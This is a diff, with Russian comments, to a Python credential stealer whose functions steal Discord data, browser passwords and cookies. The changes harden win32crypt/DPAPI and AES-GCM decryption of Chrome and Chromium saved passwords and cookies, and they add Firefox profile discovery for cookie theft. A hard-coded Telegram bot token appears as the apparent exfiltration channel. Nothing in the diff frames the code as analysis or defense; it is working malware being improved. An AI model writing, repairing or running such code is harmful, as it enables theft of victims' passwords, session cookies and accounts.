@@ -25,9 +25,15 @@ from Cryptodome.Cipher import AES
 
 # Исправленный импорт для Windows-специфичных модулей
 if platform.system() == "Windows":
-    import win32crypt
+    try:
+        import win32crypt
+        HAS_WIN32CRYPT = hasattr(win32crypt, 'CryptUnprotectData')
+    except (ImportError, AttributeError):
+        HAS_WIN32CRYPT = False
     import winreg
     import ctypes
+else:
+    HAS_WIN32CRYPT = False
 
 # Конфигурация Telegram
 TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
@@ -308,7 +314,7 @@ def steal_discord_data():
 
 def get_encryption_key(browser_path):
     """Получает ключ шифрования с поиском Local State в родительской папке"""
-    if platform.system() != "Windows":
+    if platform.system() != "Windows" or not HAS_WIN32CRYPT:
         return None
     
     # Поиск Local State в текущей и родительской папке
@@ -334,13 +340,6 @@ def get_encryption_key(browser_path):
         encrypted_key = encrypted_key[5:]
         try:
             return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        except AttributeError:
-            # Исправление для ошибки с отсутствующим атрибутом
-            if hasattr(win32crypt, 'CryptUnprotectData'):
-                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-            else:
-                print("Ошибка: win32crypt не имеет атрибута CryptUnprotectData")
-                return None
         except Exception as e:
             print(f"Ошибка в win32crypt.CryptUnprotectData: {e}")
             return None
@@ -350,17 +349,14 @@ def get_encryption_key(browser_path):
 
 def decrypt_password(password, key):
     """Расшифровывает пароль"""
-    if not key:
-        # Попробуем расшифровать только с помощью DPAPI
-        if platform.system() == "Windows":
+    try:
+        if not key and platform.system() == "Windows" and HAS_WIN32CRYPT:
             try:
                 return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
             except:
                 return ""
-        return ""
-    
-    try:
-        if isinstance(password, bytes) and len(password) > 15:
+        
+        if key and isinstance(password, bytes) and len(password) > 15:
             iv = password[3:15]
             payload = password[15:]
             cipher = AES.new(key, AES.MODE_GCM, iv)
@@ -370,15 +366,13 @@ def decrypt_password(password, key):
             except:
                 pass
         
-        # Для старых версий (DPAPI) - только Windows
-        if platform.system() == "Windows":
+        if platform.system() == "Windows" and HAS_WIN32CRYPT:
             try:
                 return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
             except:
                 return ""
     except:
         pass
-    
     return ""
 
 def steal_chrome_passwords(browser_name, profile_path):
@@ -412,7 +406,10 @@ def steal_chrome_passwords(browser_name, profile_path):
                 continue
         
         conn.close()
-        temp_db.unlink()  # Удаляем временный файл
+        try:
+            temp_db.unlink(missing_ok=True)  # Удаляем временный файл
+        except:
+            pass
         return passwords
     except Exception as e:
         print(f"Ошибка при краже паролей {browser_name}: {e}")
@@ -457,7 +454,7 @@ def steal_chromium_cookies(browser_name, profile_path):
                                 decrypted_value = ""
                     else:
                         # Для старых версий (DPAPI)
-                        if platform.system() == "Windows":
+                        if platform.system() == "Windows" and HAS_WIN32CRYPT:
                             try:
                                 decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
                             except:
@@ -479,7 +476,10 @@ def steal_chromium_cookies(browser_name, profile_path):
                 continue
         
         conn.close()
-        temp_db.unlink()  # Удаляем временный файл
+        try:
+            temp_db.unlink(missing_ok=True)  # Удаляем временный файл
+        except:
+            pass
         return cookies
     except Exception as e:
         print(f"Ошибка при краже куки {browser_name}: {e}")
@@ -511,7 +511,6 @@ def steal_passwords():
                 passwords = []
                 
                 if browser_name == "firefox":
-                    # Для Firefox оставим заглушку
                     print(f"Для браузера {display_name} пароли не поддерживаются")
                 elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
@@ -564,7 +563,20 @@ def steal_cookies():
                 if browser_name == "firefox":
                     # Для Firefox используем browser_cookie3
                     try:
-                        jar = browser_cookie3.firefox()
+                        firefox_profile = None
+                        if platform.system() == "Windows":
+                            firefox_path = Path(os.getenv('APPDATA')) / 'Mozilla' / 'Firefox' / 'Profiles'
+                            if firefox_path.exists():
+                                for profile in firefox_path.iterdir():
+                                    if profile.is_dir() and '.default' in profile.name:
+                                        firefox_profile = str(profile)
+                                        break
+                        
+                        if firefox_profile:
+                            jar = browser_cookie3.firefox(domain_name='', profile_path=firefox_profile)
+                        else:
+                            jar = browser_cookie3.firefox(domain_name='')
+                        
                         for cookie in jar:
                             cookies.append({
                                 'host': cookie.domain,
